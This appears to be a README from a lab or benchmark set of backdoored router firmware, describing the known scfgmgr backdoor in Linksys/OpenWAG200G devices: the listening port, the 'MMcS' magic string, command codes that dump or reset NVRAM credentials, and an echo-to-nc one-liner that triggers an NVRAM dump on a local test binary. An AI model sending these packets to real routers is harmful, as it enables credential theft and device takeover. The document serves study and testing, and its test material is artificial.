# Linksys OpenWAG200G scfgmgr backdoor
- **Type**: hidden command
- **Affected versions**: multiple routers (see [reference](#reference))


## Backdoor
The executable `scfgmgr` contained in the firmware at `/usr/sbin/scfgmgr` is a server listening on
port 64639/TCP. The port number may vary between different versions. Upon receiving a packet
starting with the magic string `"MMcS"` (or `"ScMM"`, depending on the endianness), it interprets
the following 4 bytes as a command:
- `0x0001`: dump the NVRAM (including credentials)
- `0x0002`: get the value of the NVRAM entry (specified in the sent packet)
- `0x0003`: set the NVRAM entry to a value (both specified in the sent packet)
- `0x0004`: commit NVRAM
- `0x000b`: reset NVRAM to default settings (including credentials)


## Triggering the backdoor
First, we need to copy the file used as a stand-in for the actual NVRAM to `/tmp`:
```console
$ cp ./nvram /tmp/
```
Then, we need to start up the `scfgmgr` binary (e.g., with the _backdoored_ variant):
```console
$ ./backdoored/scfgmgr
```
In a separate terminal, we can trigger the backdoor (e.g., to dump the NVRAM):
```console
$ #             | command      | payload size  |
$ echo -en "MMcS\x01\x00\x00\x00\x00\x00\x00\x00" | nc localhost 64639
... [NVRAM dump] ...
```


## Reference
<https://github.com/elvanderb/TCP-32764>
